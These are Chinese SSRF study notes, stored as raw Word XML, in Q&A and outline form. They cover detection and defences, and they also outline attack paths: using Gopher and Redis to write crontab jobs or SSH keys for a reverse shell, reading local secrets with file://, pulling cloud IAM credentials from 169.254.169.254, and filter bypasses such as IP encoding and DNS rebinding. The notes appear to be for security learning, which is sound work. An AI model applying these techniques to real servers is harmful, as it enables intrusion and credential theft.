        <w:t>答</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">] (1) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>对解析后的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>做二次</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>校验（请求前再解析一次）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">(2) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>白名单而不是黑名单</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> (3) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>禁用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> DNS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>缓存</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> (4) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>如果条件允许，使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>白名单</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D21C0AD" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">] Gopher </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>协议有什么限制？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E9A3E8" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>答</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">] PHP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>默认支持</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> Gopher wrapper</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">curl </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>默认支持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> gopher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">Java </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> Python </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>需要额外库。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">Gopher </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>构造的数据需要做</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>编码，推荐用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> Gopherus </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>工具生成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> Payload</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0841ED2D" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>怎么区分</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>漏洞和正常功能？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64348E6B" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>答</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>判断标准：如果用户可以控制请求的目标地址、协议或端口中的任意一项，且服务</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>端没有</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>做充分限制，就存在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>风险。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F488C1E" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t xml:space="preserve">] SSRF </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>能拿到反弹</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t xml:space="preserve"> Shell </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>吗？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D342E4C" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>答</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>可以。通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> Gopher + Redis </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>攻击，可以向内网</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> Redis </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>写入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> crontab </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>任务执行反弹</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> shell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>，或者写入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSH </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>公钥实现免密登录</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>这是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>从信息探测升级到命令执行的标准路径。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E0D374" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>十一、知识框架图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D1CEBAB" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>提示</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>按照笔记里的要求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>提取下文字，自己做一个这个图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>，以下是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>完整知识</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>框架：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3989F9DB" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="002E49D8">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D430E43" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>发现</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10871A07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找</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">RL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>参数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>图片预览</w:t>
      </w:r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WebHook</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> / API </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>代理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>文件上传</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>翻译服务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29FE316C" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="002E49D8">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17BABC87" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>验证</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71DF34AC" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>判断是否服务端发请求（</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">F12 Network </w:t>
      </w:r>
      <w:r>
        <w:t>面板）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF49C14" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>测内网</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> IP</w:t>
      </w:r>
      <w:r>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:t>127.0.0.1 / localhost</w:t>
      </w:r>
      <w:r>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35146CD4" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>测</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file:// </w:t>
      </w:r>
      <w:r>
        <w:t>读本地文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9FD861" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="002E49D8"/>
    <w:p w14:paraId="6E3CF97F" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:t>利用</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343C6B82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内网探测：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">dict:// </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>协议扫端口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CF52323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文件读取：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">file:// </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>读配置</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>密码</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>密钥</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33519F14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云凭据：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">169.254.169.254 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>获取</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> IAM </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>临时凭证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D507FEE" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>RCE</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:t>gopher</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">:// + Redis -&gt; webshell / </w:t>
      </w:r>
      <w:r>
        <w:t>反弹</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7448BA1B" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="002E49D8"/>
    <w:p w14:paraId="25188630" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:t>绕过</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E093F7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 xml:space="preserve">IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>变形：十六进制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>十进制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>八进制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/IPv6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A992ADF" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>域名：</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">xip.io / </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>自建域名</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> DNS </w:t>
      </w:r>
      <w:r>
        <w:t>指向内网</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="010E7313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URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">@ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>绕过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> / # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>绕过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>子域名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> / 302 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>跳转</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22614D03" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>DNS</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">DNS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Rebinding</w:t>
      </w:r>
      <w:r>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:t>TTL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:t>，先外网后内网）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D42CE8" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>协议：</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">dict / file / gopher / ftp </w:t>
      </w:r>
      <w:r>
        <w:t>切换</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCB83D5" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="002E49D8"/>
    <w:p w14:paraId="398D3F69" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:t>防御</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC663BD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协议白名单：只允许</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> http/https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27ED41D9" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">IP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>黑名单：拦截所有内网</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>云</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Metadata IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5403E2CB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 xml:space="preserve">URL </w:t>
      </w:r>
